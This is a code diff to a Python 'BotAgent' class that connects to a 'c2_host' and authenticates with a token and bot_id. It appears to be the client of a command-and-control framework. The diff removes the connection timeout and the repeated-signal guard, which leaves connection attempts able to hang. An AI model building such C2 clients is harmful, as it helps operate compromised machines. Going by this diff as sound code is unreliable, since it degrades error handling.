@@ -86,10 +86,7 @@ class BotAgent:
         try:
             while not self._shutdown_event.is_set():
                 try:
-                    reader, writer = await asyncio.wait_for(
-                        asyncio.open_connection(self.c2_host, self.c2_port, ssl=self.ssl_ctx),
-                        timeout=self.connect_timeout
-                    )
+                    reader, writer = await asyncio.open_connection(self.c2_host, self.c2_port, ssl=self.ssl_ctx)
                     self.stream = FramedStream(reader, writer)
                     await self.stream.send(Frame(type="AUTH", meta={"token": self.token, "bot_id": self.bot_id}))
                     ok = await self.stream.recv(timeout=10)
@@ -120,7 +117,7 @@ class BotAgent:
                     self.stream.close()
                     break
                     
-                except (ConnectionRefusedError, OSError, ssl.SSLError, asyncio.TimeoutError) as e:
+                except (ConnectionRefusedError, OSError, ssl.SSLError) as e:
                     if not self._shutdown_event.is_set():
                         logger.warning("connection failed: %s", e)
                         await asyncio.sleep(2)
@@ -139,11 +136,8 @@ class BotAgent:
     def _setup_signal_handlers(self):
         """Setup signal handlers for graceful shutdown."""
         def signal_handler(signum, frame):
-            if not self._shutdown_event.is_set():
-                logger.info("Received signal %d, initiating graceful shutdown...", signum)
-                self._shutdown_event.set()
-            else:
-                logger.debug("Signal %d received again; shutdown already in progress", signum)
+            logger.info("Received signal %d, initiating graceful shutdown...", signum)
+            self._shutdown_event.set()
         
         # Setup signal handlers
         signal.signal(signal.SIGINT, signal_handler)
